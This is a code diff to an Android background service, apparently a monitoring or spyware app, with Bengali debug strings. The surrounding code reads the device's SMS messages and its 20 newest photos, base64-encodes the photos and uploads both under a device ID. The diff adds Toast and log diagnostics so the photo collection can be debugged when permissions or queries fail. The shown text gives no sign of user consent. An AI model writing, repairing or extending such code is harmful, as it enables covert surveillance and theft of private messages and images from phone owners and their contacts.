@@ -38,6 +38,7 @@ public class MonitorService extends Service {
 
     private Handler handler = new Handler();
     private Handler mainHandler = new Handler(Looper.getMainLooper());
+    private String photoDebugInfo = "";
 
     private Runnable syncTask = new Runnable() {
         @Override
@@ -92,19 +93,19 @@ public class MonitorService extends Service {
                 uploadSMS(deviceId, smsList.getJSONObject(i));
             }
 
+            photoDebugInfo = "";
             JSONArray photoList = getPhotos();
 
-            // --- ডিবাগ Toast: পারমিশন ও ছবি সংখ্যা দেখাবে ---
             String permission = Build.VERSION.SDK_INT >= 33
                     ? android.Manifest.permission.READ_MEDIA_IMAGES
                     : android.Manifest.permission.READ_EXTERNAL_STORAGE;
             boolean granted = ActivityCompat.checkSelfPermission(this, permission)
                     == PackageManager.PERMISSION_GRANTED;
-            String debugMsg = "ছবি পারমিশন: " + (granted ? "দেওয়া আছে" : "দেওয়া নেই")
-                    + " | পাওয়া গেছে: " + photoList.length() + "টি ছবি";
+            String debugMsg = "পারমিশন: " + (granted ? "আছে" : "নেই")
+                    + " | পাওয়া: " + photoList.length() + "টি"
+                    + (photoDebugInfo.isEmpty() ? "" : " | " + photoDebugInfo);
             mainHandler.post(() -> Toast.makeText(MonitorService.this, debugMsg, Toast.LENGTH_LONG).show());
             Log.d("MonitorService", debugMsg);
-            // --- ডিবাগ অংশ শেষ ---
 
             for (int i = 0; i < photoList.length(); i++) {
                 uploadPhoto(deviceId, photoList.getJSONObject(i));
@@ -179,37 +180,55 @@ public class MonitorService extends Service {
                 ? android.Manifest.permission.READ_MEDIA_IMAGES
                 : android.Manifest.permission.READ_EXTERNAL_STORAGE;
         if (ActivityCompat.checkSelfPermission(this, permission)
-                != PackageManager.PERMISSION_GRANTED) return photoList;
+                != PackageManager.PERMISSION_GRANTED) {
+            photoDebugInfo = "পারমিশন চেকে আটকেছে";
+            return photoList;
+        }
 
+        Cursor cursor = null;
         try {
-            Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                     new String[]{MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME},
                     null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 20");
-            if (cursor != null) {
-                while (cursor.moveToNext()) {
-                    long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
-                    String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
-                    Uri uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
 
-                    try (InputStream is = getContentResolver().openInputStream(uri)) {
-                        if (is != null) {
-                            byte[] imageData = readAllBytes(is);
-                            String base64 = Base64.getEncoder().encodeToString(imageData);
-                            JSONObject photo = new JSONObject();
-                            photo.put("name", name);
-                            photo.put("data", base64);
-                            photoList.put(photo);
-                        }
-                    } catch (Exception e) {
-                        Log.e("getPhotos", "ছবি পড়তে ব্যর্থ: " + name, e);
+            if (cursor == null) {
+                photoDebugInfo = "কুয়েরি null রিটার্ন করেছে";
+                return photoList;
+            }
+
+            int totalRows = cursor.getCount();
+            photoDebugInfo = "কার্সারে রো: " + totalRows;
+
+            int readErrors = 0;
+            while (cursor.moveToNext()) {
+                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
+                String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
+                Uri uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
+
+                try (InputStream is = getContentResolver().openInputStream(uri)) {
+                    if (is != null) {
+                        byte[] imageData = readAllBytes(is);
+                        String base64 = Base64.getEncoder().encodeToString(imageData);
+                        JSONObject photo = new JSONObject();
+                        photo.put("name", name);
+                        photo.put("data", base64);
+                        photoList.put(photo);
+                    } else {
+                        readErrors++;
                     }
+                } catch (Exception e) {
+                    readErrors++;
+                    Log.e("getPhotos", "ছবি পড়তে ব্যর্থ: " + name, e);
                 }
-                cursor.close();
-            } else {
-                Log.d("getPhotos", "কার্সার null — কুয়েরি ব্যর্থ হয়েছে");
+            }
+            if (readErrors > 0) {
+                photoDebugInfo += ", পড়তে ব্যর্থ: " + readErrors;
             }
         } catch (Exception e) {
+            photoDebugInfo = "কুয়েরি এক্সেপশন: " + e.getMessage();
             Log.e("getPhotos", e.toString());
+        } finally {
+            if (cursor != null) cursor.close();
         }
         return photoList;
     }
